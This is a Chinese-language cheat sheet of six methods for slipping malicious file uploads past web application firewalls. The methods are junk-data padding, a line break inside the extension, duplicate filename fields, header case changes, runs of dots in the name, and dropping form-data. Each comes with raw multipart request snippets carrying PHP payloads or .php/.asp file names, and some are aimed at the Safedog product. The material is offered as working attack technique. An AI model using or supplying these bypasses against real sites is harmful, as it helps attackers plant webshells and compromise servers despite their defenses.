# WAF 绕过

## 绕过 WAF

### 1. 填充垃圾数据绕过

有些主机 WAF 软件为了不影响web服务器的性能，会对校验的用户数据设置 大小上限，比如 1M。此种情况可以构造一个大文件，前面 1M 的内容为垃圾内 容，后面才是真正的木马内容，便可以绕过 WAF 对文件内容的校验；' Content-Type 类型数据后添加垃圾数据：

```shell
Content-Type: image/jpeg

a=11111111111111111111111111111111111111111111111111111111

GIF89a

<?php phpinfo(); ?>
```

当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。

```shell
------WebKitFormBoundaryYijPw9QB0WlswSL2            
Content-Disposition: form-data; name="file_x"; filename="bk.jpg"
Content-Type: image/jpeg
a=111111111111111111111111111111111111111111111111111111111111111111111
</php phpinfo(); ?>
```

### 2. 文件扩展名回车绕过 （只支持 PHP）

```shell
Content-Disposition: form-data; nAme="upfile"; filename="bk.ph
p" Content-Type: image/jpeg
```

### 3. filename 绕过

针对早期版本安全狗，可以多加一个 filename 在一个 Content-Disposition 中，存在多个 filename ，协议解析应该使用最 后的filename 值作为文件名。如果 WAF 解析到 filename="bk.jpg"认为解析 到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是 bk.asp。

```shell
Content-Disposition: form-data; name="file1";
filename="bk.jpg";filename="bk.asp"
```

### 4. 修改 Content-Disposition 字段值的大小写绕过

对这三个固定的字换:Content-Disposition,name,filename 比如 name 转换成 Name，Content-Disposition 转换成 content-disposition。 两年前，拿它绕过安全狗的上传，不知道现在如何。

```shell
Content-Disposition: form-data; name="upfile"; filename="bk.php"
改成
Content-Disposition: form-data; nAme="upfile"; filename="bk.php"
```

### 5. 文件重命名绕过

如果 web 程序会将 filename 除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。

```shell
Content-Disposition: form-data;  name="  file1";
filename="bk....................................................................................................................
............................................................................................................asp"大概几百个点。
```

### 6. 删除 Content-Disposition 值的 form-data 绕过

有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。

```shell
Content-Disposition: form-data; name="file1"; filename= "bk.php"
改为：
Content-Disposition: name="file1"; filename= "bk.php"
```
